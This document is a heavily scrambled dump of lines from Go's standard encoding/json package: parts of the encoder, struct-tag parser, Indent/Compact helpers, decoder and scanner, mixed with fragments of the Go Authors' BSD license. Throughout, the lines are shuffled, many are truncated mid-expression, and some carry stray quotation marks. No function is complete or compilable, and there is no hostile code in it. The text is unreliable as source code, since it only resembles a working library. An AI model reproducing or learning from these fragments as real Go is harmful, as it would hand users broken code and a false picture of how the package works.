"b, err := m.MarshalJSON()"
package json
// Attempting to encode such a value causes Marshal to return
// Convert U
if v.Bool() {
"fv := fieldByIndex(v, f.index)"
" "": "" "
"b := strconv.AppendInt(e.scratch[:0], v.Int(), 10)"
"index:     index,"
if !unicode.IsLetter(c) 
if t.Implements(marshalerType) {
"current, next = next, current[:0]"
 v.IsNil() {
type field struct {
// MarshalIndent is like Marshal but applies Indent to format the output.
return v.IsNil()
e.WriteByte('t')
InvalidUTF8Error) Error() string {
return new(encodeState)
"func (sv stringValues) Swap(i, j int)      { sv[i], sv[j] = sv[j], sv[i] }"
//    Int64String int64 
func typeEncoder(t reflect.Type) encoderFunc {
switch t.Kind() {
se := 
// U
"encodeState, v reflect.Value, quoted bool)"
type byName []field
return xik < x[j].index[k]
// so that the annihilation code will see a duplicate.
"name = """""
 i < f.typ.NumField()
"""unicode/utf8"""
float64Encoder = (floatEncoder(64)).encode
if v.Type() == numberType {
err = Indent(
// in a tag name.
 advance
fieldCache.Unlock()
f := v.Float()
encodeState)
// Compute fields without lock.
type ptrEncoder struct {
// The algorithm is breadth-first search over the set of structs to include - the top struct
m map[reflect.Type][]field
e.WriteByte('[')
"b, err := m.MarshalText()"
= size
"// HTMLEscape appends to dst the JSON-encoded src with <, >, "
type InvalidUTF8Error struct {
func newEncodeState() 
// breaking ties with index sequence.
 arrays don't.
"e.WriteString(""null"")"
2028 is LINE SEPARATOR.
"// nil pointer or interface value, and any array, slice, map, or string of"
// real func (f) to be ready and then calls it.  This indirect
if xik != x[j].index[k] {
func isValidTag(s string) bool {
"// Channel, complex, and function values cannot be encoded in JSON."
return newStructEncoder(t)
return encodeByteSlice
return
"// All remaining fields have the same length. If there's more than one,"
func (x byIndex) Len() int { return len(x) }
"// usual Go rules), the following extra rules apply:"
//   // the field is skipped if empty.
2029 is PARAGRAPH SEPARATOR.
// Might duplicate effort but won't hold other computations back.
"// Before Go 1.2, an InvalidUTF8Error was returned by Marshal when"
// The fields are sorted in increasing index-length order. The winner
return f
"// integer, or boolean types. This extra level of encoding is sometimes used"
 OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY
this software without specific prior written permission.
"LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR"
 Redistributions in binary form must reproduce the above
"DATA, OR PROFITS"
 Neither the name of Google Inc. nor the names of its
"modification, are permitted provided that the following conditions are"
" LOSS OF USE,"
"Redistribution and use in source and binary forms, with or without"
"OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE."
"""AS IS"" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT"
"OWNER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL,"
(INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE
Copyright (c) 2012 The Go Authors. All rights reserved.
A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT
"THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT"
"notice, this list of conditions and the following disclaimer."
"copyright notice, this list of conditions and the following disclaimer"
THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS
"SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT"
"LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES"
in the documentation and/or other materials provided with the
met:
 Redistributions of source code must retain the above copyright
distribution.
contributors may be used to endorse or promote products derived from
type tagOptions string
import (
 idx != -1 {
if s == optionName {
// string boundary or commas.
"// tag, or the empty string. It does not include the leading comma."
1:])
s = next
return false
"// tagOptions is the string following a comma in a struct field's ""json"""
"for s != """" {"
func (o tagOptions) Contains(optionName string) bool {
"func parseTag(tag string) (string, tagOptions) {"
// Contains reports whether a comma-separated list of options
// Use of this source code is governed by a BSD-style
"i := strings.Index(s, "","")"
if i >= 0 {
// license that can be found in the LICENSE file.
"if idx := strings.Index(tag, "","")"
// contains a particular substr flag. substr must be surrounded by a
package json
s := string(o)
"s, next = s[:i], s[i"
"return tag[:idx], tagOptions(tag[idx"
// comma-separated options.
"return tag, tagOptions("""")"
// Copyright 2011 The Go Authors. All rights reserved.
var next string
if len(o) == 0 {
return true
// parseTag splits a struct field's json tag into its name and
"""strings"""
2029 (E2 80 A8 and E2 80 A9).
"import ""bytes"""
dst.Write(src[start:i])
// Emit semantically uninteresting bytes
// delay indent so that empty object and array are formatted as {} and [].
"return compact(dst, src, false)"
 v != scanEndObject 
"for i, c := range src {"
default:
case ':':
return nil
scan.bytes
start = i 
v := scan.step(
var scan scanner
needIndent = false
// Compact appends to dst the JSON-encoded src with
"// if src ends in a trailing newline, so will dst."
// Add spacing around real punctuation.
if v == scanContinue {
start := 0
scan.reset()
"case '{', '[':"
depth := 0
"// any indentation, to make it easier to embed inside other formatted JSON data."
dst.WriteString(indent)
dst.WriteString(prefix)
depth
dst.Write(src[start:])
if escape 
2 < len(src) 
dst.WriteByte(hex[c>>4])
dst.WriteByte(' ')
if needIndent {
"// Each element in a JSON object or array begins on a new,"
if start < len(src) {
"bytes.Buffer, src []byte, prefix, indent string) error {"
origLen := dst.Len()
// at the end of src are preserved and copied to dst.
dst.WriteByte(c)
0xF])
if needIndent 
if start < i {
if v == scanSkipSpace {
 c == '
2028 and U
dst.Truncate(origLen)
continue
// insignificant space characters elided.
u202
 src[i
// license that can be found in the LICENSE file.
 v != scanEndArray {
dst.WriteByte(hex[src[i
} else {
needIndent = true
break
1 == 0xA8 {
if scan.eof() == scanError {
// The data appended to dst does not begin with the prefix nor
if v == scanError {
dst.WriteString(
func compact(dst 
"case ',':"
 c == '>' 
1] == 0x80 
depth--
for i := 0
"// (in particular, punctuation in strings) unmodified."
"for _, c := range src {"
"bytes.Buffer, src []byte, escape bool) error {"
// copies of indent according to the indentation nesting.
"// Although leading space characters (space, tab, carriage return, newline)"
// suppress indent in empty object/array
package json
// Convert U
"newline(dst, prefix, indent, depth)"
if v >= scanSkipSpace {
// indented line beginning with prefix followed by one or more
dst.WriteByte(hex[c
"// at the beginning of src are dropped, trailing space characters"
func newline(dst 
// Copyright 2010 The Go Authors.  All rights reserved.
return scan.err
if c == 0xE2 
"bytes.Buffer, src []byte) error {"
// Use of this source code is governed by a BSD-style
 (c == '<' 
"scan, c)"
needIndent := false
func Indent(dst 
switch c {
// Indent appends to dst an indented form of the JSON-encoded src.
"bytes.Buffer, prefix, indent string, depth int) {"
func Compact(dst 
 i < depth
"case '}', ']':"
dst.WriteByte('
"// For example, if src has no trailing spaces, neither will dst"
') {
// Our scanner has seen the opening brace/bracket
type UnmarshalTypeError struct {
case scanBeginObject:
c := d.data[d.off]
"UnmarshalTypeError{""number"", v.Type(), int64(d.off)})"
"float64, for JSON numbers"
 '0' <= s[0] 
"d.error(fmt.Errorf(""json: invalid number literal, trying to unmarshal %q into Number"", item))"
for 
default:
d.off = 0
// fromQuoted indicates whether this literal came from unwrapping a
 v.NumMethod() == 0 {
return n
if subv.IsNil() {
n := len(d.scan.parseState)
"// Instead, they are replaced by the Unicode replacement"
if v.NumMethod() != 0 {
 s[0] <= '9':
 s[0] == '.' 
 d.scan.parseState[n-1] == parseObjectKey {
// on the value and produces no error.
"return b[0:w], true"
// map must have string kind
// in the value pointed to by v.
switch s[r] {
if c != '-' 
v.Set(reflect.Zero(v.Type()))
var subv reflect.Value
decodeState) saveError(err error) {
"""errors"""
panic(r)
var mapElem reflect.Value
"// otherwise, ignore null for primitives/string"
case reflect.Interface:
d.off = len(d.data) - len(rest)
"// The rules are different than for Go, so cannot use strconv.Unquote."
v.Set(reflect.ValueOf(string(s)))
decodeState) valueQuoted() interface{} {
item := d.data[start:d.off]
"if _, ok := r.(runtime.Error)"
// Ran out of fixed array: skip.
// decodeState represents the state while decoding a JSON value.
if rv.Kind() != reflect.Ptr 
decodeState) error(err error) {
// next cuts off and returns the next full JSON value in d.data[d.off:].
utf8.UTFMax {
// String returns the literal text of the number.
d.savedError = err
 decodingNull 
if v.Kind() != reflect.Ptr {
if c == '{' {
"decodeState) literalStore(item []byte, v reflect.Value, fromQuoted bool) {"
"return s, true"
// that can unmarshal a JSON description of themselves.
// by setting that Go value to nil. Because null is often used in JSON to mean
"d.scan, ']')"
 1 // mark processed EOF with len
for {
// byte with RuneError.
// (The argument to Unmarshal must be a non-nil pointer.)
} else {
"Value  string       // description of JSON value - ""bool"", ""array"", ""number -5"""
 e.Elem().Kind() == reflect.Ptr) {
"// object consumes an object from d.data[d.off-1:], decoding into the value v."
if d.scan.redo {
return d.literalInterface()
break
FFFD.
if d.savedError == nil {
d.error(
decodeState) init(data []byte) 
"= utf8.EncodeRune(b[w:], dec)"
if len(item) == 0 {
"func Unmarshal(data []byte, v interface{}) error {"
"// if it encounters an Unmarshaler, indirect stops and returns that."
"panic(""unreachable"")"
decodeState) next() []byte {
// valueQuoted is like value but decodes a
// there is a bug in the JSON decoder or something is editing
v.Set(newv)
"if dec := utf16.DecodeRune(rr, rr1)"
case 't':
UnmarshalFieldError) Error() string {
// Coerce to well-formed UTF-8.
"UnmarshalTypeError{""number "" "
"var numberType = reflect.TypeOf(Number(""""))"
"// Read opening "" of string key or closing }."
// The xxxInterface routines build up a value to be stored
 s[0] != '
"if u, ok := v.Interface().(Unmarshaler)"
"if u, ok := v.Interface().(encoding.TextUnmarshaler)"
v.SetLen(i 
defer func() {
// Unmarshal uses the inverse of the encodings that
"b := make([]byte, len(s)"
// e or E followed by an optional - or 
case 'n':
 e.Field.Name 
"return ""json: Unmarshal(non-pointer "" "
switch v := d.literalInterface().(type) {
v.Set(reflect.ValueOf(value))
"err := checkValid(data, "
 finish the object
// the first byte ('{') of the object has been read already.
// The first byte of the literal has been read already
return d.unmarshal(v)
"// start with its address, so that if the type has pointer methods,"
"// If v is a named type and is addressable,"
// An UnmarshalFieldError describes a JSON object key that
 strconv.Quote(e.Key) 
data       []byte
err := u.UnmarshalJSON(d.next())
fallthrough
" s[0] != '""' "
if rr == utf8.RuneError 
// Unmarshal will only set exported fields of the struct.
d.value(reflect.Value{})
// objectInterface is like object but returns map[string]interface{}.
"r, err := strconv.ParseUint(string(s[2:6]), 16, 64)"
// Figure out field corresponding to key.
if e.Type == nil {
case reflect.Bool:
b[w] = '
newcap := v.Cap() 
newcap = 4
"// Represents JSON data structure using native Go types: booleans, floats,"
s = s[1:]
// so that it knows we got to the end of the value.
 fall back to replacement rune.
"// Marshal uses, allocating maps, slices, and pointers as necessary,"
case s[0] == '0':
"// Next token must be , or }."
"= utf8.EncodeRune(b[w:], rr)"
"case 't', 'f': // true, false"
return false
"item, rest, err := nextValue(d.data[d.off:], "
func (e 
s = s[1 : len(s)-1]
case scanBeginLiteral:
// Check for duplicate keys.
fields := cachedTypeFields(v.Type())
// It updates d.off and returns the new scan code.
"// If no more serious errors are encountered, Unmarshal returns"
// Use of this source code is governed by a BSD-style
"key, ok := unquote(item)"
for len(s) > 0 
" s[len(s)-1] != '""' {"
"', '/', '"
// Read : before value.
// to zero and then appends each element to the slice.
"// To unmarshal JSON into a pointer, Unmarshal first handles the case of"
"case reflect.Float32, reflect.Float64:"
if c == '
// allocates a new value for it to point to.
d.scan.reset()
section-6
// unquote converts a quoted JSON string literal s into an actual string t.
v.SetBool(value)
Type reflect.Type
if t.Key().Kind() != reflect.String {
v.SetBytes(b[:n])
 c {
case 'f':
"UnmarshalTypeError{""object"", v.Type(), int64(d.off)})"
"[]interface{}, for JSON arrays"
 s[0] == 'E') {
d.value(rv)
if v.Kind() == reflect.String 
 v.OverflowFloat(n) {
"rr, size := utf8.DecodeRune(s[r:])"
"return nil, "
// quoted string literal or literal null into an interface value.
// arrayInterface is like array but returns []interface{}.
elemType := v.Type().Elem()
if newcap < 4 {
field
v.SetString(s)
// Otherwise it's invalid.
decodeState) array(v reflect.Value) {
"newv := reflect.MakeSlice(v.Type(), v.Len(), newcap)"
"w := copy(b, s[0:r])"
// led to an unexported (and therefore unwritable) struct field.
// Decoding into nil interface
return v
if v.Kind() == reflect.Interface 
"return u, nil, reflect.Value{}"
"// The next value is known to be an object or array, not a literal."
"// As a special case, to unmarshal an empty JSON array into a slice,"
subv = subv.Field(i)
 e.Value 
// All bytes inside literal return scanContinue op code.
"// Get element of array, growing if necessary."
"return s == """""
 consume.
"d.error(fmt.Errorf(""json: duplicate key '%s' in object"", key))"
"""strconv"""
 c > '9') {
value := c == 't'
"b := make([]byte, base64.StdEncoding.DecodedLen(len(s)))"
if op != scanBeginLiteral {
 kept for compatibility.)
 v.OverflowInt(n) {
op := d.scanWhile(scanContinue)
"// To unmarshal JSON into a struct, Unmarshal matches incoming object"
// value decodes a JSON value from d.data[d.off:] into the value.
newOp = d.scan.eof()
v.Set(reflect.ValueOf(n))
d.error(errPhase)
"// literal consumes a literal from d.data[d.off-1:], decoding into the value v."
if op == scanEndArray {
op := d.scanWhile(scanSkipSpace)
d.object(v)
for i := range fields {
keys[key] = true
UnmarshalJSON([]byte) error
if f != nil {
// malformed UTF-8 and we're replacing each
rr1 := getu4(s[r:])
if v.Kind() == reflect.Map {
op = d.scanWhile(scanSkipSpace)
// depending on the setting of d.useNumber.
d.next()
 i < v.Len()
rr := getu4(s[r:])
"bool, for JSON booleans"
"func (n Number) Int64() (int64, error) {"
"// or if a JSON number overflows the target type, Unmarshal"
// scanWhile processes bytes in d.data[d.off:] until it
// Avoids filling out half a data structure
"// string from the "",string"" struct tag option. this is used only to"
case reflect.Slice:
destring := false // whether the value is wrapped in a string to be decoded first
decodeState) literalInterface() interface{} {
case '1' <= s[0] 
 v.CanAddr() {
// This function implements the JSON numbers grammar.
case 'u':
s := string(item)
if err != nil {
// Read string key.
" s, reflect.TypeOf(0.0), int64(d.off)}"
if s[0] == '
// Check type of target: struct or map[string]T
decodeState) scanWhile(op int) int {
return d
"return ""json: Unmarshal(nil)"""
"// if using struct, subv points into struct already."
"""fmt"""
 dec != unicode.ReplacementChar {
return s
d.off = len(d.data) 
"d.scan, '}')"
" "" into Go value of type "" "
"u, ut, pv := d.indirect(v, false)"
"// then no unquoting is needed, so return a slice of the"
decodeState) objectInterface() map[string]interface{} {
// produce more helpful error messages.
"""reflect"""
  Can only happen if s is full of
"UnmarshalTypeError{""string"", v.Type(), int64(d.off)})"
// the additional JSON array elements are discarded.
if v.Type().Elem().Kind() != reflect.Uint8 {
func isValidNumber(s string) bool {
err := u.UnmarshalJSON(item)
"// If the Go array is smaller than the JSON array,"
"var v = make([]interface{}, 0)"
// Check for well-formedness.
"func unquoteBytes(s []byte) (t []byte, ok bool) {"
// isValidNumber reports whether s is a valid JSON number literal.
z := reflect.Zero(v.Type().Elem())
"nb := make([]byte, (len(b)"
// Decode into element.
func (d 
"return ""json: Unmarshal(nil "" "
err = r.(error)
 (s[0] == 'e' 
"reflect.Copy(newv, v)"
if e.Kind() == reflect.Ptr 
return 
if !mapElem.IsValid() {
"// Load value from interface, but only if the result will be"
"// To unmarshal JSON into an interface value,"
// Float64 returns the number as a float64.
nil for JSON null
UnmarshalTypeError) Error() string {
decodeState {
if op != scanArrayValue {
v.Set(reflect.MakeMap(t))
b[w] = c
Field reflect.StructField
type InvalidUnmarshalError struct {
"for _, i := range f.index {"
case reflect.String:
" "")"""
"""runtime"""
v = pv
"n, err := strconv.ParseUint(s, 10, 64)"
"return ""json: cannot unmarshal "" "
// d.scan thinks we're still at the beginning of the item.
 s[0] == '-' {
"string, for JSON strings"
// errPhase is used for errors that should not happen unless
 c < ' ' {
if op == scanSkipSpace {
d.value(v.Index(i))
d.saveError(
// . followed by 1 or more digits.
b[w] = s[r]
decodeState) arrayInterface() []interface{} {
"_, rest, err := nextValue(d.data[d.off:], "
v.Set(reflect.New(v.Type().Elem()))
if destring {
"// To unmarshal a JSON array into a Go array, Unmarshal decodes"
subv.Set(reflect.New(subv.Type().Elem()))
utf8.UTFMax)
type Unmarshaler interface {
// Unmarshaler is the interface implemented by objects
if r := recover()
InvalidUnmarshalError) Error() string {
// Check type of target.
// if it wishes to retain the data after returning.
"// the value pointed at by the pointer.  If the pointer is nil, Unmarshal"
//Empty string given
case 'n': // null
// Make sure we are at the end.
"d.saveError(fmt.Errorf(""json: invalid use of ,string struct tag, trying to unmarshal %q into %v"", item, v.Type()))"
 s[0] <= '9' {
  Switch to non-reflect code.
switch c := item[0]
d.off
v.SetLen(i)
if !ok {
"d.saveError(fmt.Errorf(""json: invalid use of ,string struct tag, trying to unmarshal unquoted value into %v"", subv.Type()))"
"copy(nb, b[0:w])"
d.scan.undo(op)
"d.error(fmt.Errorf(""json: invalid use of ,string struct tag, trying to unmarshal %q into %v"", item, v.Type()))"
rr = unicode.ReplacementChar
subv = v
fields[i]
d.init(data)
"case '""', '"
" "" of type "" "
// Check for unmarshaler.
start := d.off - 1
"// the JSON being the JSON literal null.  In that case, Unmarshal sets"
if v.IsNil() {
// Out of room
d.nextscan)
"n, err := strconv.ParseFloat(s, v.Type().Bits())"
"map[string]interface{}, for JSON objects"
"""unicode"""
 v.Cap()/2
// A valid pair
if v.Kind() == reflect.Array {
return m
 s[1] != 'u' {
type decodeState struct {
if n > 0 
if i >= v.Len() {
// The input can be assumed to be a valid encoding of
"d.literalStore(nullLiteral, subv, false)"
"""encoding/base64"""
"if s == """" {"
"decodeState) convertNumber(s string) (interface{}, error) {"
d.array(reflect.Value{})
 r != nil {
return d.objectInterface()
f = ff
 s[1] <= '9' {
"n, err := strconv.ParseInt(s, 10, 64)"
// convertNumber converts the number literal s to a float64 or a Number
 !v.IsNil() {
return rune(r)
useNumber  bool
"s, ok := unquote(item)"
// literalStore decodes a literal stored in item into v.
 op {
"s, ok = unquoteBytes(s)"
"d.scan, ':')"
// JSON array elements into corresponding Go array elements.
// invalid UTF-16 surrogate pairs are not treated as an error.
return d.arrayInterface()
" v.Type().Name() != """" "
"u, ut, pv := d.indirect(v, wantptr)"
// Copyright 2010 The Go Authors. All rights reserved.
kv := reflect.ValueOf(key).Convert(v.Type().Key())
// character U
d.literal(v)
type unquotedValue struct{}
d.scan.step(
"case c == '""', c < ' ':"
return err
"var nullLiteral = []byte(""null"")"
// 1 or more digits.
" "" into unexported field "" "
d.saveError(err)
if op != scanObjectKey {
if len(s) < 6 
if len(s) >= 2 
// usefully addressable.
if r >= len(s) {
// Optional -
"// If it finds anything other than a quoted string literal or null,"
// and thinks we're still in the middle of the object.
"not present,'' unmarshaling a JSON null into any other Go type has no effect"
switch v.Kind() {
switch op := d.scanWhile(scanSkipSpace)
err := ut.UnmarshalText(s)
// test must be applied at the top level of the value.
t = string(s)
if fromQuoted {
m[key] = d.valueInterface()
// the additional Go array elements are set to zero values.
case c < utf8.RuneSelf:
// (that's how the caller knows it's a literal).
d.scan)
"// Quote, control characters are invalid."
d.value(subv)
for r < len(s) {
default: // number
"return strconv.ParseInt(string(n), 10, 64)"
// error aborts the decoding by panicking with err.
// Read key.
// not appropriate for a value of a specific Go type.
 (!decodingNull 
"n, err := d.convertNumber(s)"
// Scan read one byte too far
if !isValidNumber(s) {
if d.off >= len(d.data) {
func (n Number) String() string { return string(n) }
"d.literalStore(d.data[start:d.off], v, false)"
if ut != nil {
case nil:
s = s[2:]
// Back up so d.value can have the byte we just read.
"f, err := strconv.ParseFloat(s, 64)"
// A Number represents a JSON number literal.
nextscan   scanner // for calls to nextValue
decodeState) valueInterface() interface{} {
case 'r':
"case reflect.Interface, reflect.Ptr, reflect.Map, reflect.Slice:"
 v.OverflowUint(n) {
"// array consumes an array from d.data[d.off-1:], decoding into the value v."
v.Set(reflect.ValueOf(d.arrayInterface()))
"return strconv.ParseFloat(string(n), 64)"
Type  reflect.Type
// and http://json.org/number.gif
keys := map[string]bool{}
"// If a JSON value is not appropriate for a given target type,"
// An InvalidUnmarshalError describes an invalid argument passed to Unmarshal.
subv = mapElem
case string:
// until it gets to a non-pointer.
d.off--
 v.Kind() == reflect.Slice {
switch {
subv = subv.Elem()
d.scan.redo = false
// d.scan thinks we just read an object key
if v.Kind() != reflect.Ptr 
 v.Type() == numberType {
v.SetFloat(n)
// before discovering a JSON syntax error.
d.savedError = nil
// Invalid surrogate
// We decode rv not rv.Elem because the Unmarshaler interface
scan       scanner
var d decodeState
return item
wantptr := item[0] == 'n' // null
// preferring an exact match but also accepting a case-insensitive match.
// it updates d.off to point past the decoded value.
if u != nil {
// valueInterface is like value but returns interface{}
"// To unmarshal a JSON object into a string-keyed map, Unmarshal first"
e := v.Elem()
"uXXXX from the beginning of s, returning the hex value,"
// ASCII
case reflect.Struct:
if len(s) < 2 
func getu4(s []byte) rune {
if e.Type.Kind() != reflect.Ptr {
if newOp != op {
"// The JSON null value unmarshals into an interface, map, pointer, or slice"
d.error(err)
"// Feed in an empty string - the shortest, simplest value -"
if subv.Kind() == reflect.Ptr {
"n, err := base64.StdEncoding.Decode(b, s)"
v = v.Elem()
"case reflect.Int, reflect.Int8, reflect.Int16, reflect.Int32, reflect.Int64:"
v.Index(i).Set(z)
// a JSON value. UnmarshalJSON must copy the JSON data
// Int64 returns the number as an int64.
var newOp int
i := 0
// original bytes.
decodeState) literal(v reflect.Value) {
if utf16.IsSurrogate(rr) {
// but they avoid the weight of reflection in this common case.
// (No longer used
"// When unmarshaling quoted strings, invalid UTF-8 or"
panic(err)
 (c < '0' 
return c == 't'
d.object(reflect.Value{})
// Look ahead for ] - can only happen on first iteration.
// Unmarshal replaces the slice with a new empty slice.
"return f, nil"
return nil
"var errPhase = errors.New(""JSON decoder out of sync - data changing underfoot"
"return nil, u, reflect.Value{}"
"""bytes"""
"case '""': // string"
item := d.data[start : d.off-1]
"case reflect.Uint, reflect.Uint8, reflect.Uint16, reflect.Uint32, reflect.Uint64, reflect.Uintptr:"
if !v.IsValid() {
// Grow slice if necessary
v.SetInt(n)
mapElem = reflect.New(elemType).Elem()
"// If the JSON array is smaller than the Go array,"
"v.Set(reflect.MakeSlice(v.Type(), 0, 0))"
Offset int64        // error occurred after reading Offset bytes
// the first byte of the array ('[') has been read already.
v.SetUint(n)
switch d.scanWhile(scanSkipSpace) {
return newOp
c := s[r]
"// establishes a map to use, If the map is nil, Unmarshal allocates a new map."
"d.literalStore([]byte(qv), subv, true)"
 !e.IsNil() 
rv := reflect.ValueOf(v)
case c == '
// invent a closing brace/bracket to get it out.
if i < v.Len() {
if d.useNumber {
"return ""json: cannot unmarshal object key "" "
// Write value back to map
 e.Type.String() 
if v.Type().NumMethod() > 0 {
 back up.
// Array.  Zero the rest.
b = nb
 and
if v.Kind() == reflect.Slice {
// Unmarshal then stores key-value pairs from the JSON object into the map.
"// the pointer to nil.  Otherwise, Unmarshal unmarshals the JSON into"
decodeState) unmarshal(v interface{}) (err error) {
"v.SetMapIndex(kv, subv)"
if op == scanEndObject {
if err != nil 
"d.scan, '""')"
continue
op = d.scanWhile(scanContinue)
"decodeState) indirect(v reflect.Value, decodingNull bool) (Unmarshaler, encoding.TextUnmarshaler, reflect.Value) {"
case reflect.Array:
// license that can be found in the LICENSE file.
 e.Type.String()
return -1
"n, err := d.convertNumber(string(item))"
"if bytes.Equal(ff.nameBytes, []byte(key)) {"
type Number string
"// Next token must be , or ]."
// skips that field and completes the unmarshaling as best it can.
 size == 1 {
// An UnmarshalTypeError describes a JSON value that was
if v.NumMethod() == 0 {
decodeState) value(v reflect.Value) {
 ok {
"d.scan, c)"
case reflect.Map:
"UnmarshalTypeError{""array"", v.Type(), int64(d.off)})"
r := 0
import (
if i >= v.Cap() {
v.SetString(string(s))
type UnmarshalFieldError struct {
"""unicode/utf16"""
"_, ok = keys[key]"
"if item[0] != '""' {"
Type   reflect.Type // type of Go value it could not be assigned to
Key   string
if s[0] == '-' {
"""encoding"""
// the data slice while the decoder executes.
"// strings, arrays, and maps."
InvalidUnmarshalError{reflect.TypeOf(v)}
newOp = d.scan.step(
// See https://tools.ietf.org/html/rfc7159
"// indirect walks down v allocating pointers as needed,"
"case nil, string:"
decodeState) object(v reflect.Value) {
if op != scanObjectValue {
// an UnmarshalTypeError describing the earliest such error.
return unquotedValue{}
"func (n Number) Float64() (float64, error) {"
return d.savedError
"func unquote(s []byte) (t string, ok bool) {"
package json
switch c := s[r]
off        int // read offset in data
// valueQuoted returns unquotedValue{}.
d.array(v)
"s, ok := unquoteBytes(item)"
// Read value.
"return Number(s), nil"
"// saveError saves the first err it is called with,"
// with the following additional rules:
" c == '""' "
if r == len(s) {
"// in an empty interface.  They are not strictly necessary,"
v = e
savedError error
 '0' <= s[1] 
// we find them.
d.scan.step = stateBeginValue
d.next() // skip over { } in input
ff := 
// receives a scan code not equal to op.
 v.CanSet() {
"""unicode/utf8"""
destring = f.quoted
case 'b':
// literalInterface is like literal but returns an interface value.
if v.Elem().Kind() != reflect.Ptr 
switch qv := d.valueQuoted().(type) {
// or it returns -1.
// Digits
if i == 0 
m := make(map[string]interface{})
t := v.Type()
if c < utf8.RuneSelf {
mapElem.Set(reflect.Zero(elemType))
= size
"// Check for unusual characters. If there are none,"
// rewind.
// for reporting at the end of the unmarshal.
if w >= len(b)-2
v.Set(reflect.ValueOf(d.objectInterface()))
 rv.IsNil() {
d.data = data
"v = append(v, d.valueInterface())"
// closing } - can only happen on first iteration.
if rr < 0 {
// Unmarshal stores one of these in the interface value:
"// keys to the keys used by Marshal (either the struct field name or its tag),"
return
"// To unmarshal a JSON array into a slice, Unmarshal resets the slice length"
"// if decodingNull is true, indirect stops at the last pointer so it can be set to nil."
case scanBeginArray:
v = v.Addr()
var f 
"// Otherwise Unmarshal reuses the existing map, keeping existing entries."
// Unmarshal parses the JSON-encoded data and stores the result
"return nil, nil, v"
"UnmarshalTypeError{""bool"", v.Type(), int64(d.off)})"
// getu4 decodes 
" s, v.Type(), int64(d.off)})"
"// digits of a number, such as after reading "
"// is not a space, scanEndTop allocates a needless error."
// pushParseState pushes a new parse state p onto the parse stack.
"u hexadecimal character escape"")"
// Complain about non-space byte on next call.
"return s.error(c, ""in exponent of numeric literal"")"
s := strconv.Quote(string(c))
return scanEndArray
if c == 'e' {
// stateNu is the state after reading 
// stateInStringEscU123 is the state after reading 
redoState func(
s.step = stateFal
case 'f': // beginning of false
// stateBeginString is the state after reading 
"scanError // hit an error, scanner.err."
 c == 'E' {
s.parseState = s.parseState[0:0]
s.step = stateN
s.pushParseState(parseObjectKey)
s.step = stateInStringEscU123
if s.redo {
func stateDot0(s 
"// with a switch, but using the func directly was 10% faster"
" known to be last ""continue"" result"
// to recognize the end of numbers: is 123 a whole value or
" "" "" "
case 'n': // beginning of null
u123
"// and at least one digit of the exponent in a number,"
// every subsequent call will return scanError too.
// This file starts with two simple examples using the scanner
"return s.error(c, ""in "
"', '/', '""':"
 c <= '9' {
// stateTr is the state after reading 
"case scanEndObject, scanEndArray:"
"// stateE0 is the state after reading the mantissa, e, optional sign,"
func stateEndValue(s 
 during a number.
s.step = stateBeginValue
"return state0(s, c)"
s.step = state1
// state0 is the state after reading 
} else {
// eof tells the scanner that the end of input has been reached.
return scanSkipSpace
func stateInString(s 
step func(
// These values are returned by the state transition functions
if v >= scanEndObject {
s.step = stateInStringEsc
"s.parseState = append(s.parseState, p)"
"if c == ',' {"
scanObjectValue         // just finished non-last object value
s.step = stateBeginString
func stateF(s 
// stateTru is the state after reading 
if c == ']' {
// just got passed in.  (The indication must be delayed in order
"s.step(s, ' ')"
// Completed top-level before the current byte.
 'A' <= c 
s.parseState[n-1] = parseObjectValue
"return stateEndValue(s, c)"
scanner) reset() {
s.redo = true
s.step = stateDot
"1], data[i"
 but not 
"// JSON value has been completed, "
Offset int64  // error occurred after reading Offset bytes
 during a quoted string.
// otherwise common code from the multiple scanning functions
func stateNu(s 
"// stateESign is the state after reading the mantissa, e, and sign in a number,"
"// The return value, referred to as an opcode, tells the"
msg    string // description of error
if s.endTop {
"if scan.step(scan, c) == scanError {"
s.step = stateInStringEscU1
s.step = stateFals
// Stop.
s.step = s.redoState
type SyntaxError struct {
case '{':
scanBeginLiteral        // end implied by next result != scanContinue
func stateESign(s 
s.step = stateError
func stateTru(s 
"return stateBeginValue(s, c)"
s.step = stateT
 s[1:len(s)-1] 
s.parseState = s.parseState[0:n]
func (e 
s.redoState = s.step
s.step = stateRedo
if c <= ' ' 
s.step = stateNeg
// Use of this source code is governed by a BSD-style
s.pushParseState(parseArrayValue)
switch c {
s.step = stateTru
s.step = stateNu
if c == '
func stateEndTop(s 
// Also tried using an integer constant and a single func
// callers might be interested to know about.
3.14
parseObjectValue        // parsing object value (after colon)
case scanError:
s.step = stateInStringEscU
"// and ending literals, objects, and arrays, so that the"
if c == 's' {
s.redo = false
// stateNeg is the state after reading 
"// stateError is the state after reaching a syntax error,"
'' {
314e-2
scan.bytes
err error
// It must be called before calling s.step.
case parseArrayValue:
"return stateESign(s, c)"
"import ""strconv"""
// stateFa is the state after reading 
// stateFal is the state after reading 
func stateInStringEsc(s 
 c == '-' {
// stateBeginValue is the state at the beginning of the input.
case parseObjectKey:
func stateInStringEscU1(s 
"case '""':"
return c == ' ' 
// before diving into the scanner itself.
"case 'b', 'f', 'n', 'r', 't', '"
// popParseState pops a parse state (already obtained) off the stack
"return data[:i], data[i:], nil"
func stateBeginString(s 
return scanObjectValue
endTop bool
"scanner) (value, rest []byte, err error) {"
// The step is a func to be called to execute the next transition.
// stateT is the state after reading 
0.314e
 c <= '9' { // beginning of 1234.5
case 'u':
// the beginning of 12345e
if scan.eof() == scanError {
"return s.error(c, ""after array element"")"
return scanBeginArray
// These values are stored in the parseState stack.
case parseObjectValue:
scanner) eof() int {
"{""key"": value,"
// being scanned.  If the parser is inside a nested value
s.step = stateDot0
